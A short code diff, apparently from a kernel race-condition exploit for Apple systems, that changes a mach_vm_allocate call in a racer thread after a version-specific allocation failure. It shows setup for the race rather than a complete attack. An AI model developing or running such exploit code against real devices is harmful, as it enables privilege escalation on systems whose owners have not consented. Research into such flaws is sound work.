@@ -73,8 +73,10 @@ static void *p177_racer2(void *arg) {
     Lf(@"%@", head); [o appendString:head];
 
     mach_vm_address_t anonAddr = 0;
+    /* 27.2.1 receipt: VM_FLAGS_SUPERPAGE_SIZE_ANY over an 0x8000 alloc fails
+       kr=0x4 (superpages demand a 2MB multiple/alignment). Plain ANYWHERE. */
     kern_return_t kr = mach_vm_allocate(mach_task_self(), &anonAddr, 0x8000,
-                                        VM_FLAGS_ANYWHERE | VM_FLAGS_SUPERPAGE_SIZE_ANY);
+                                        VM_FLAGS_ANYWHERE);
     if (kr != KERN_SUCCESS) { Lf(@"[-] anon alloc failed kr=0x%x", kr); if (g_fd>=0) close(g_fd); return o; }
     mach_port_t anonObj = MACH_PORT_NULL;
     mach_vm_size_t entrySize = 0x8000;
